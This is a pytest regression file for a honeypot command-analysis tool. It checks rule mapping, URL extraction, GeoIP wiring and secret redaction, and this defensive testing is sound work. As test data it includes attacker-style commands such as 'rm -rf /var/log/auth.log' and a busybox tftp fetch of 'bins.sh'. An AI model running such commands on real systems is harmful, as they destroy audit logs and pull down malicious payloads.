"""Regression tests for the pre-deployment audit."""

import time
from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import func, select

from surya_kundal.config import Settings
from surya_kundal.database.engine import create_db_engine, init_db, make_session_factory
from surya_kundal.database.models import Command, HoneypotSession, SessionMapping
from surya_kundal.mapping.engine import map_command
from surya_kundal.mapping.fetches import extract
from surya_kundal.mapping.store import map_pending
from surya_kundal.pipeline import build_providers

T0 = datetime(2026, 10, 1, 12, 0, tzinfo=UTC)


@pytest.fixture
def db(tmp_path):
    engine = create_db_engine(f"sqlite:///{tmp_path / 'a.db'}")
    init_db(engine)
    with make_session_factory(engine)() as session:
        yield session


def test_mapping_can_work_in_slices(db):
    for n in range(5):
        db.add(
            HoneypotSession(id=f"s{n}", src_ip="80.66.76.10", start_time=T0 + timedelta(hours=n))
        )
        db.flush()
        db.add(Command(session_id=f"s{n}", command="uname -a", timestamp=T0))
    db.commit()
    first = map_pending(db, limit=2)
    assert (first.sessions, first.more) == (2, True)
    second = map_pending(db, limit=2)
    assert (second.sessions, second.more) == (2, True)
    third = map_pending(db, limit=2)
    assert (third.sessions, third.more) == (1, False)
    assert db.scalar(select(func.count()).select_from(SessionMapping)) == 5
    assert map_pending(db, limit=2).sessions == 0


@pytest.mark.parametrize("filler", [" " * 8000, "a " * 4000, "/var/log/" * 800])
def test_rules_stay_fast_on_hostile_input(filler):
    started = time.perf_counter()
    for prefix in ("curl", "rm", "> ", "truncate -s 0"):
        map_command(prefix + filler + "x")
    assert time.perf_counter() - started < 1.0


def test_log_clearing_and_external_ip_rules_still_match():
    ids = {m.rule_id for m in map_command("rm -rf /var/log/auth.log")}
    assert "evasion-clear-logs" in ids
    assert "discovery-external-ip" in {m.rule_id for m in map_command("curl -s ifconfig.me")}


def test_tftp_filename_is_not_taken_for_the_host():
    found = extract("busybox tftp -g -l bins.sh -r bins.sh 1.2.3.4")
    assert [f.url for f in found] == ["tftp://1.2.3.4/bins.sh"]


def test_the_daily_geoip_refresh_is_wired_when_keys_exist(tmp_path):
    env = {
        "MAXMIND_ACCOUNT_ID": "1",
        "MAXMIND_LICENSE_KEY": "k" * 16,
        "GEOIP_DB_DIR": str(tmp_path),
    }
    assert build_providers(Settings.from_env(env)).geoip_update is not None
    assert build_providers(Settings.from_env({"GEOIP_DB_DIR": str(tmp_path)})).geoip_update is None


def test_settings_never_print_secrets():
    text = repr(
        Settings.from_env({"ABUSEIPDB_API_KEY": "topsecret1", "DASHBOARD_TOKEN": "tok" * 6})
    )
    assert "topsecret1" not in text and "tok" * 6 not in text


def test_vacuum_works_and_restores_the_environment(tmp_path, monkeypatch):
    from surya_kundal.maintenance import vacuum

    monkeypatch.delenv("SQLITE_TMPDIR", raising=False)
    engine = create_db_engine(f"sqlite:///{tmp_path / 'v.db'}")
    init_db(engine)
    engine.dispose()
    import os

    before, after = vacuum(f"sqlite:///{tmp_path / 'v.db'}")
    assert after <= before and "SQLITE_TMPDIR" not in os.environ
